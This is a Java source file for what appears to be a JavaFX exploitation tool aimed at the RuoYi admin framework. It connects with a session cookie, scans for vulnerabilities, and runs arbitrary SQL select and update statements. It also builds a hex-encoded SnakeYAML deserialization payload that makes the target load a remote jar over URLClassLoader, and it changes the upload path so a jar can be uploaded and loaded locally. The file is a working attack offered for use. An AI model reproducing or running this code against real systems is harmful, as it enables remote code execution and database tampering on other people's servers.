package com.ruoyi.controller;

import com.ruoyi.Main;
import com.ruoyi.exp.JdbcExp;
import com.ruoyi.exp.VulScan;
import com.ruoyi.exp.YamlExp;
import com.ruoyi.exp.UploadExp;
import com.ruoyi.global.Config;
import com.ruoyi.util.HexUtil;
import com.ruoyi.util.JobUtil;
import com.ruoyi.util.RequestUtil;
import com.ruoyi.util.ResultUtil;
import javafx.beans.value.ChangeListener;
import javafx.beans.value.ObservableValue;
import javafx.event.EventHandler;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.*;
import javafx.scene.input.MouseEvent;
import javafx.stage.FileChooser;

import java.net.URL;
import java.util.ResourceBundle;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MainController implements Initializable {

    @FXML
    Tab vulTab;

    @FXML
    TextField urlText;

    @FXML
    TextField cookieText;

    @FXML
    Button submitBtn;

    @FXML
    TextArea vulText;

    @FXML
    Tab snakeyamlTab;

    @FXML
    TextField snakeyamlUrlText;

    @FXML
    Button snakeyamlBtn;

    @FXML
    TextArea snakeyamlText;

    @FXML
    Tab jdbcTab;

    @FXML
    TextArea jdbcText;

    @FXML
    ChoiceBox jdbcMode;

    @FXML
    Label jdbcPayloadLabel;

    @FXML
    Button jdbcBtn;

    @FXML
    TextField jdbcSqlText;

    @FXML
    Tab uploadTab;

    @FXML
    TextArea uploadText;

    @FXML
    TextField uploadPathText;

    @FXML
    ComboBox jarPathText;

    @FXML
    Button uploadBtn;

    public void conn() {
        ResultUtil.clear();
        if (urlText.getText().isEmpty()) {
            urlText.setText("http://127.0.0.1:9090");
        } else {
            if (urlText.getText().endsWith("/")) {
                urlText.setText(urlText.getText().substring(0, urlText.getText().length() - 1));
            }
        }
        if (cookieText.getText().isEmpty()) {
            if (urlText.getText().equals("http://127.0.0.1:9090")) {
                cookieText.setText("sessionid=epngmgjx2rrd90itak61fm6ms545lnh7; JSESSIONID=f1038b7d-faea-4c77-a7d9-14b5f713f5f6;");
            } else {
                ResultUtil.fail("Cookie不能为空");
                return;
            }
        }
        Config.url = urlText.getText();
        Config.cookie = cookieText.getText();
        String resp = RequestUtil.get(Config.url, Config.cookie);
        Pattern pattern = Pattern.compile("<p>(.*?)</p>");
        Matcher matcher = pattern.matcher(resp);
        if (matcher.find()) {
            Config.isConnected = true;
            String user = matcher.group(1);
            ResultUtil.success("登陆成功，当前用户：" + user);
            ResultUtil.log("正在检测漏洞...");
            VulScan.scan();
            if (!Config.vulMode.contains("snakeyaml")) {
                snakeyamlTab.setDisable(true);
            }
            if (!Config.vulMode.contains("jdbc")) {
                jdbcTab.setDisable(true);
                uploadTab.setDisable(true);
            }
        } else {
            ResultUtil.fail("登陆失败");
        }
    }

    public boolean checkConn() {
        if (!Config.isConnected) {
            ResultUtil.log("请先配置连接信息");
            return false;
        }
        return true;
    }


    public void changeResultText(Tab tab, TextArea resultText) {
        if (tab.isSelected()) {
            Config.resultText = resultText;
        }
    }

    public void yamlExp() {
        if (!checkConn()) return;
        ResultUtil.clear();
        if (snakeyamlUrlText.getText().isEmpty()) {
            snakeyamlUrlText.setText("http://127.0.0.1:8081/1.jar");
        }
        Config.snakeyamlUrl = snakeyamlUrlText.getText();
        String exception = YamlExp.exp();
        if (!exception.isEmpty()) {
            ResultUtil.fail("远程jar包加载失败，异常原因：" + exception);
        } else {
            ResultUtil.success("远程jar包加载成功");
        }
    }

    public void sqlExp() {
        if (!checkConn()) return;
        ResultUtil.clear();
        if (jdbcSqlText.getText().equals("")) {
            if (jdbcMode.getValue().equals("snakeyaml RCE")) {
                jdbcSqlText.setText("http://127.0.0.1:8081/1.jar");
            } else {
                jdbcSqlText.setText("select user();");
                jdbcMode.setValue(jdbcMode.getItems().get(0));
            }
        }
        String sql = jdbcSqlText.getText();
        String mode;
        if (jdbcMode.getValue().equals("snakeyaml RCE")) {
            Config.snakeyamlUrl = jdbcSqlText.getText();
            sql = "0x" + HexUtil.string2HexString("org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"{jarUrl}\"]]]]')".replace("{jarUrl}", jdbcSqlText.getText()));
            mode = "snakeyaml";
            String exception = JdbcExp.sqlExp(sql, mode);
            if (exception.equals("")) {
                ResultUtil.success("远程jar包加载成功");
            } else {
                ResultUtil.fail("远程jar包加载失败，异常原因：" + exception);
            }
        } else {
            if (jdbcMode.getValue().toString().contains("select")) {
                mode = "select";
                ResultUtil.success(JdbcExp.sqlExp(sql, mode));
            } else {
                mode = "update";
                JdbcExp.sqlExp(sql, mode);
                String exception = JobUtil.getLog();
                if (exception.equals("")) {
                    ResultUtil.success("update语句执行成功");
                } else {
                    ResultUtil.fail("update语句执行失败，异常原因：" + exception);
                }
            }
        }
    }

    public void uploadExp() {
        if (!checkConn()) return;
        ResultUtil.clear();
        System.out.println(uploadPathText.getText());
        if (!uploadPathText.getText().isEmpty()) {
            if (UploadExp.setProfile(uploadPathText.getText())) {
                ResultUtil.success("修改文件上传路径成功，当前地址：" + uploadPathText.getText());
                Config.uploadPath = uploadPathText.getText();
            } else {
                ResultUtil.fail("修改文件上传路径失败");
            }
        }
        if (Config.uploadPath.isEmpty()) {
            ResultUtil.log("请先修改上传路径");
            return;
        }
        if (!jarPathText.getItems().isEmpty()) {
            String jarFilePath = UploadExp.uploadJar().replace("/profile", "");
            if(!jarFilePath.isEmpty()) {
                Config.snakeyamlUrl = "file:///" + Config.uploadPath + jarFilePath;
                ResultUtil.success("上传jar包成功，自动配置jar包路径："+Config.snakeyamlUrl);
            } else {
                ResultUtil.fail("上传失败");
            }
        }
    }


    @Override
    public void initialize(URL location, ResourceBundle resources) {
        changeResultText(vulTab, vulText);
        vulTab.setOnSelectionChanged(event -> {
            changeResultText(vulTab, vulText);
        });
        submitBtn.setOnAction(event -> {
            conn();
        });


        snakeyamlTab.setOnSelectionChanged(event -> {
            changeResultText(snakeyamlTab, snakeyamlText);
        });
        snakeyamlBtn.setOnAction(event -> {
            yamlExp();
        });


        jdbcTab.setOnSelectionChanged(event -> {
            changeResultText(jdbcTab, jdbcText);
            if (!Config.snakeyamlUrl.isEmpty()) {
                snakeyamlUrlText.setText(Config.snakeyamlUrl);
            }
        });
        jdbcMode.getItems().addAll(new String[]{"select查询", "update更新", "snakeyaml RCE"});
        jdbcMode.setValue(jdbcMode.getItems().get(0));
        jdbcPayloadLabel.setText("请输入select查询语句");

        jdbcMode.getSelectionModel().selectedItemProperty().addListener(new ChangeListener() {
            @Override
            public void changed(ObservableValue observable, Object oldValue, Object newValue) {
                System.out.println(newValue);
                if (newValue.equals("update更新")) {
                    jdbcSqlText.setText("");
                    jdbcPayloadLabel.setText("请输入update更新语句");
                } else if (newValue.equals("snakeyaml RCE")) {
                    jdbcPayloadLabel.setText("请输入远程jar包地址");
                    if (!Config.snakeyamlUrl.isEmpty()) {
                        jdbcSqlText.setText(Config.snakeyamlUrl);
                    }
                } else {
                    jdbcSqlText.setText("");
                    jdbcPayloadLabel.setText("请输入select查询语句");
                }
            }
        });
        jdbcBtn.setOnAction(event -> {
            sqlExp();
        });


        uploadTab.setOnSelectionChanged(event -> {
            changeResultText(uploadTab, uploadText);
        });
        uploadBtn.setOnAction(event -> {
            uploadExp();
        });
        jarPathText.addEventHandler(MouseEvent.MOUSE_CLICKED, new EventHandler<MouseEvent>() {
            @Override
            public void handle(MouseEvent event) {
                FileChooser fileChooser = new FileChooser();
                fileChooser.setTitle("请选择jar包路径");
                fileChooser.getExtensionFilters().add(new FileChooser.ExtensionFilter("jar文件", "*.jar"));
                Config.jarFile = fileChooser.showOpenDialog(Main.getStage());
                if (Config.jarFile.exists()) {
                    jarPathText.getItems().add(Config.jarFile.getName());
                    jarPathText.setValue(Config.jarFile);
                }
            }
        });


    }
}
